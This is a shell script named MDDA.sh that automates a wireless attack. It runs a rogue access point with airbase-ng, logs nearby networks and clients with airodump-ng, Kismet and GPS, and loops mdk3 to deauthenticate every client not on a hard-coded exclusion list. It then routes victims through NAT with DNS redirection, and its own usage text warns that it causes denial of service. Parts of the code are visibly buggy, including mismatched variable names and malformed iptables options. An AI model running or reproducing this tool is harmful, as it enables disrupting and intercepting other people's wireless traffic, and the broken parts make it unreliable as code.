#!/bin/sh 
# 
################################################################################################### 
# MDDA.sh 
# Presents Options to the user
usage() { 
        clear 
        echo -e "$0\n"
        echo -e "\033[31m WARNING! This script will create a DoS condition when running!\n" 
        echo -e " WARNING! Some routers have been known to fail when attacked!\n" 
        echo -e "\033[0m usage: $PROG -w -b -H [options]\n" 
        echo "  -k   --kismet           Wireless interface to run kismet on" 
        echo "  -a   --airbase          Wireless interface to run airdump and airbase-ng on" 
        echo "  -m   --mdk3               Wireless interface to run mdk3 on" 
        echo "  -h   --haul               Back haul interface to cary all data back to internet" 
        echo "  -n   --netblock           Netblock for local network, default is 255.255.255.0" 
        echo "  -b   --bssid              Bssid of access point to spoof" 
        echo "  -V   --version            Show the Program version" 
        #echo "  -i   --IP               The IP Address block for internal nat" 
        #echo "  -c   --client            The Client you wish to hijack" 
        echo "  -C   --channel           Channel to set AP up on" 
        echo "  -H   --help              Show this help message" 
        echo "" 
        exit 0 
}
################################################################################################### 
# Script Variables 
# Does the argument parseing from the user 
script_arg() { 
        if [ "$1" == "" ]; 
          then 
            usage 
          else 
            while [ "$1" != "" ];
              do 
                    case "$1" in 
                      -k|--kismet) 
                        shift 
                        K=$1 
                      ;; 
                      -a|--airbase) 
                        shift 
                        K=$1 
                      ;; 
                      -m|--mdk3) 
                        shift 
                        K=$1 
                      ;; 
                      -n|--netblock) 
                        shift 
                        N=$1 
                      ;; 
                      -b|--bssid) 
                        shift 
                        B=$1 
                      ;; 
                      -h|--haul) 
                        shift 
                        BH=$1 
                      ;; 
                      -H|--help) 
                        usage 
                      ;; 
                      -i|--IP) 
                        shift 
                        ip=$1 
                      ;; 
                      -c|--client) 
                        shift 
                        client=$1 
                        HJ=1  
                        #sets the option to hijack a client to true 
                      ;; 
                      -C|--channel) 
                        shift 
                        channel=$1 
                      ;; 
                      -V|--version) 
                        pversion 
                      ;; 
                      *) 
                        usage 
                      ;; 
                    esac 
                        shift 
                        if [ "$1" == "" ]; 
                          then 
                            #this next section calls all the modules that makes this script run 
                            die # stops some applications 
                            gps  #sets up gps 
                            promis  #configures RFMON as needed 
                            kis #configures kismet interface 
                            air #configures airbase interface 
                            mdk3 #configures DnD interface 
                            disc #routing discovery procedure 
                            ipts #iptables scrubbing 
                            iptc #iptables configuration 
                            bh #backhaul interface 
                        fi 
              done 
        fi 
} 
################################################################################################### 
# Stop conflicts 
# kills all running programs that the script starts to remove conflicts
die() { 
    echo "Kills some problem Applications " 
    sleep 3
    if [ "`ps -A xf| grep -v grep |  tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep airbase | cut -d ' ' -f1`" != "" ]; then
      ps -A xf| grep -v grep |  tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep airbase | cut -d " " -f1 | xargs kill -9 >/dev/null
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep airodump | cut -d ' ' -f1`" != "" ]; then
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep airodump | cut -d ' ' -f1 | xargs kill -9 >/dev/null
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep dhcpcd-bin | cut -d ' ' -f1`" != "" ]; then
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep dhcpcd-bin | cut -d ' ' -f1 | xargs kill -9 >/dev/null
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep dhclient | cut -d ' ' -f1`" != "" ]; then
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep dhclient | cut -d ' ' -f1 | xargs kill -9 >/dev/null
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep knetworkmanager | cut -d ' ' -f1`" != "" ]; then
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep knetworkmanager | cut -d ' ' -f1 | xargs kill -9 >/dev/null
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep dnsmasq | cut -d ' ' -f1`" != "" ]; then
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep dnsmasq | cut -d ' ' -f1 | xargs kill -9 >/dev/null
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep kismet_server | cut -d ' ' -f1`" != "" ]; then
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep kismet_server | cut -d ' ' -f1 | xargs kill -9 >/dev/null 
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep kismet_client | cut -d ' ' -f1`" != "" ]; then
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep kismet_client | cut -d ' ' -f1 | xargs kill -9 >/dev/null
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep kismet | cut -d ' ' -f1`" != "" ]; then
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep kismet | cut -d ' ' -f1 | xargs kill -9 >/dev/null 
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep mdk3 | cut -d ' ' -f1`" != "" ]; then 
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep mdk3 | cut -d ' ' -f1 | xargs kill -9 >/dev/null
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep wpa_supp | cut -d ' ' -f1`" != "" ]; then  
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep wpa_supp | cut -d ' ' -f1 | xargs kill -9 >/dev/null
    fi
    if [ "`ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep gpsd | cut -d ' ' -f1`" != "" ]; then 
      ps -A xf| grep -v grep | tr -s ' ' | sed -r 's/^ (.*)/\1/g' | grep gpsd | cut -d ' ' -f1 | xargs kill -9  >/dev/null
    fi
} 
################################################################################################### 
# Setup GPSD device
# sets up the gps devices and requires GPSD 
gps() { 
    echo "Checking if gpsd is installed " 
    if [ `locate gpsd | grep gpsd | cut -d"/" -f4` !="gpsd" ];
      then 
        echo "You must have Gpsd install before running this script" 
        exit 1 
      else 
        echo "Ensure your streaming NMEA data from your GPS device, sleep while you check!" 
        sleep 15 
        echo "Plug in your USB GPS device if you have not already had, now! You have 15 seconds." 
        sleep 15 
        gpsd /dev/ttyUSB0 
        #xterm 96x25+0+0 -e cat /dev/ttyUSB0 # for testing of NMEA stream, your location may differ! 
    fi
} 
################################################################################################### 
# Setup RFMON interface for Kismet/newcore
# places card in monitor mode hard coded for madwifi 
promis() { 
    if [ `ifconfig | tr -s " " ";" | cut -d";" -f1 | tr -d "/n" | grep wifi` != "wifi0" ];
      then 
        echo "You must have an Atheros chipset to continue using this script!" 
        sleep 5 
        exit 1 
      else 
        airmon-ng stop ath0 
        airmon-ng stop ath1 
        airmon-ng stop ath2 
        echo "Enabling first VAP now!" 
        sleep 1 
        airmon-ng start wifi0 #enables ath0 
    fi     
} 
################################################################################################### 
# Run Kismet 
#runs the kismet service
kis() { 
    echo "Please make sure your kismet override interface and options are properly configured below before using this script!" 
    sleep 5 
    if [ `dpkg -l | grep kismet | tr -s " " | cut -d" " -f2 | cut -d"-" -f1 | sort -u` !="kismet" ];
      then 
        echo "Please make sure you have Kismet installed before using this script!" 
        sleep 5 
        exit 1 
    fi 
    if [ `cat /usr/etc/kismet.conf | grep nsource=interface` !="interface:options" ];
      then 
        echo "Starting Kismet-oldschool now!" 
        sleep 3 
        xterm 192x50+0+0 -e kismet -c madwifi_g,wifi0,madwifi & 
      else 
        echo "Using Kismet-newcore. " 
        sleep 3 
        xterm 192x50+0+0 -e kismet -c wifi0:madwifi & 
    fi 
} 
################################################################################################### 
# Setup and configure Airodump and Airbase-ng
# preps and runs airodump to monitor and airbase-ng to act as the fake AP
air() { 
    echo "Setting up other VAPs needed for applications" 
    sleep 5 
    if [ `ifconfig kis0 | tr -s " " ";" | cut -d";" -f5` == "PROMISC" ]; 
      then 
        echo "The script has failed to properly configure Kismet which prevents us from going further." 
        sleep 5 
        exit 1 
      else 
        airmon-ng start wifi0 #enables ath1 
        airmon-ng start wifi0 #enables ath2 
    fi 
        echo "Checking the existance of the log directory!" 
        sleep 3 
    if [ `ls /home | grep MDDA-logs` != "MDDA-logs" ];
      then 
        mkdir /home/MDDA-logs 
      else 
        echo "Starting Airodump-ng on interface ath1" 
        sleep 3 
        xterm 192x50+0+0 -e airodump-ng --gpsd -w /home/MDDA-logs/raw-blacklist.txt --berlin 10 --showack ath1 & 
        echo "Starting Airbase-ng on interface ath1" 
        sleep 3 
        xterm 96x25+0+0 -e airbase-ng -P -C 20 -c 9 -a 00:DE:AD:BE:EF:00 --essid "I<3Pwnies" -F /home/MDDA-logs/airbase ath1 & 
    fi 
} 
################################################################################################### 
# Setup MDK3
# configures mdk3 for use to attack/deauth clients
mdk3() {
    if [`ls /usr/local/sbin/mdk3 | cut -d"/" -f5` !="mdk3"];
      then 
        echo "MDK3 not install or linked to the proper location" 
        sleep 5 
        exit 1 
      else 
        echo "Removing defunctive files" 
        rm -rf /home/MDDA-logs/whitelist 
        rm -rf /home/MDDA-logs/blacklist 
        rm -rf /home/MDDA-logs/mdk3out.txt 
    fi 
        echo " MDK3 infinite loop for Blacklist creation, kill the script with <CTRL+c> " 
        sleep 1 
    for (( ; ; )); 
      do 
        touch /home/MDDA-logs/blacklist 
        mdk3 ath2 d -b /home/MDDA-logs/blacklist | tee -a /home/MDDA-logs/mdk3out.txt; 
        sleep 10 
        #cat /home/Kismet*.nettxt | grep Client | cut -d" " -f5 | grep -v FF:FF:FF:FF:FF:FF | sort -u >> /home/MDDA-logs/whitelist 
        cat /home/MDDA-logs/raw-blacklist.txt*.csv | cut -d";" -f4 | grep -v FF:FF:FF:FF:FF:FF | grep -v 00:DE:AD:BE:EF:00 | grep -v 00:0C:41:42:F5:CA | grep -v 00:0C:41:9C:06:07| grep -v 00:12:17:AF:F0:CD | sort -u >> /home/MDDA-logs/blacklist 
        sleep 1 
        killall -9 mdk3 
    done 
}
################################################################################################### 
# IP / Routing Discovery
# detect routes as best as could be for this attack methodology / usage
disc(){
    sleep 10 
    TIP=`ifconfig ath2 | grep -m1 addr: | cut -d":" -f2 | cut -d" " -f1` 
    TRN=`route -n | grep UG | grep ath2 | cut -d" " -f10` 
    if [ "$TNR" = "" ];
      then 
        echo " Was unable to locate a default gateway " 
        sleep 3 
        echo " A Blackhole route will be used on clients " 
        exit 0
    fi 
    # What about captive portal?
} 
################################################################################################### 
# Scrub IPTables 
# scrubs the IPtable rules
ipts(){ 
    echo "Cleaning up IPTables" 
    sleep 3 
    iptables --flush 
    iptables --table-nat --flush 
    iptables --delete-chain 
    iptables --table-nat --delete-chain         
} 
################################################################################################### 
# Configure IPTables
# set up IP tables for basic NAT
iptc(){
    echo "IPTables Configuration" 
    sleep 3 
    if [ `cat /proc/sys/net/ipv4/ip_forward` !="1" ];
      then 
        echo 1 > /proc/sys/net/ipv4/ip_forward 
      else 
        iptables --table-nat --append POSTROUTING --out-interface ath2 -j MASQUERADE 
        iptables --append FORWARD --in-interface at0 -j ACCEPT 
        iptables -t nat -A PREROUTING -p udp -dport 53 -j DNAT --to $TNR 
    fi 
} 
################################################################################################### 
# Setup Backhaul Interface 
# To enable this feature the end user will have to configure it for their system. 
#   You can use any other connection to the internet, such as: 
#     *EvDO Tether    *PPP Link    *Wireless    *Ethernet 
# Configure this following section properly in order to server/forward your clients. 
################################################################################################### 
# hard coded backhaul interface?
bh(){ 
    macchanger -r at0 
    ifconfig at0 up 
    ifconfig at0 192.168.78.1 netmask 255.255.255.0 
    route add -net 192.168.78.0 netmask 255.255.255.0 gw 10.10.2.20 
}
###########################################################
# Main Application logic 
script_arg $@
